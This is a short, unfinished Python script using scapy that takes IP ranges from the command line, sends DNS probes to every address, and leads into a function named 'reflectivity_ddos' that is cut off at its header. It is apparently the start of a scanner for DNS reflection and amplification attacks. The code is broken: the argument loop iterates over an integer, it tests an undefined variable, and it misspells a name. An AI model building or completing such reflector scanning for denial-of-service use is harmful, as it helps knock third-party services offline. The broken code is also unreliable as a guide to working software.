#!/usr/bin/python

import Queue
import threading
import netaddr
import sys
from scapy.all import *

ip_address=[]
for argv in len(sys.argv):
    if ip == 0:
        continue
    ip_address.append(netaddr.IPNetwork(sys.argv[argv]))

scan_target_queue=Queue.Queue()
for ip_list in ip_address:
    for ip in ip_list:
        scan_target_queue.put(ip)


def Scan_target():
    global scan_target_queue
    targe_ip=scan_target_queue.get()
    ans,uans=sr(IP(dst=targe_ip)/UDP()/DNS())


def reflectivity_ddos():